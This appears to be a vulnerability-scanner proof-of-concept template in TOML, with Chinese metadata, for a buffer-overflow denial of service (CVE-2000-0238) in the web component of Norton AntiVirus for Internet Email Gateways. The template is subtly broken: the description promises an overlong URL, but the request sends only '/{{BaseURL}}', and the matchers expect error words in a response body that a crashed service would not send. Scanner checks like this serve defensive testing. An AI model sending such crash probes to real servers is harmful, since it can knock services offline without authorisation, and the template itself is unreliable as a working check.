[info]
author = "AVE"
description = "向目标Norton AntiVirus for Internet Email Gateways的Web服务组件发送超长URL请求，触发缓冲区溢出导致服务进程崩溃，验证是否存在拒绝服务漏洞。"
id = "POC-AVE-2000-0216"
name = "Symantec Norton AntiVirus for Internet Email Gateways Web服务器缓冲区溢出拒绝服务漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0216"]
vuln_id = [
    "CVE-2000-0238",
    "AVE-2000-0216",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Connection reset",
    "no response",
    "timeout",
]
